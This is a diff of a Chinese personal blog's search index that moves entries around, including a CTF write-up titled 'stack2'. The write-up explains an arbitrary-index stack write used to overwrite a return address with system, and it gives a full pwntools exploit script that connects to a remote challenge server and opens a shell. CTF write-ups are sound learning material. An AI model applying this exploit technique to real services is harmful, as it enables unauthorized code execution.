@@ -352,6 +352,86 @@ shell管理你与操作系统之间的交互：
       </tags>
   </entry>
   <entry>
+    <title>test</title>
+    <url>/2020/04/04/test/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>分类</category>
+      </categories>
+      <tags>
+        <tag>测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack2</title>
+    <url>/2019/10/11/stack2/</url>
+    <content><![CDATA[<p>1.file命令查看为32位</p>
+<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
+<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
+<p>3.做题首先运行一下，查看程序的运行过程</p>
+<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
+<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
+<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
+<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
+<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
+<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
+<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
+<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
+<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
+<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
+<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
+<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
+
+from pwn import*
+
+
+
+
+
+
+system_addr=0x080485AF
+leave_offset=0x84
+
+
+def write_addr(addr,va):
+    io.sendline(&quot;3&quot;)
+    io.recvuntil(&quot;which number to change:\n&quot;)
+    io.sendline(str(addr))
+    io.recvuntil(&quot;new number:\n&quot;)
+    io.sendline(str(va))
+    io.recvuntil(&quot;5. exit\n&quot;)
+
+io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
+io.recvuntil(&quot;How many numbers you have:\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;Give me your numbers\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;5. exit\n&quot;)
+
+
+# write  system_addr  0x08048450
+
+write_addr(leave_offset,0X50)
+write_addr(leave_offset+1,0X84)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+# sh_addr  0x08048987
+leave_offset+=8
+print leave_offset
+write_addr(leave_offset,0x87)
+write_addr(leave_offset+1,0X89)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+
+io.sendline(&quot;5&quot;)
+io.interactive()    </code></pre>]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/2020/03/04/share/</url>
     <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
@@ -436,75 +516,6 @@ CMD [&quot;app.py&quot;]
 这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
-    <title>stack2</title>
-    <url>/2019/10/11/stack2/</url>
-    <content><![CDATA[<p>1.file命令查看为32位</p>
-<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
-<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
-<p>3.做题首先运行一下，查看程序的运行过程</p>
-<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
-<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
-<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
-<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
-<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
-<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
-<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
-<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
-<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
-<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
-<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
-<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
-<pre><code>#!/usr/bin/python
-#coding:utf-8
-
-from pwn import*
-
-
-
-
-
-
-system_addr=0x080485AF
-leave_offset=0x84
-
-
-def write_addr(addr,va):
-    io.sendline(&quot;3&quot;)
-    io.recvuntil(&quot;which number to change:\n&quot;)
-    io.sendline(str(addr))
-    io.recvuntil(&quot;new number:\n&quot;)
-    io.sendline(str(va))
-    io.recvuntil(&quot;5. exit\n&quot;)
-
-io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
-io.recvuntil(&quot;How many numbers you have:\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;Give me your numbers\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;5. exit\n&quot;)
-
-
-# write  system_addr  0x08048450
-
-write_addr(leave_offset,0X50)
-write_addr(leave_offset+1,0X84)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-# sh_addr  0x08048987
-leave_offset+=8
-print leave_offset
-write_addr(leave_offset,0x87)
-write_addr(leave_offset+1,0X89)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-
-io.sendline(&quot;5&quot;)
-io.interactive()    </code></pre>]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>stack</title>
     <url>/2019/09/27/stack_explain/</url>
     <content><![CDATA[<a id="more"></a>
@@ -524,17 +535,6 @@ esp  </code></pre><p>待更新。。</p>
 ]]></content>
       <tags>
         <tag>有关栈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>test</title>
-    <url>/2020/04/04/test/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>分类</category>
-      </categories>
-      <tags>
-        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
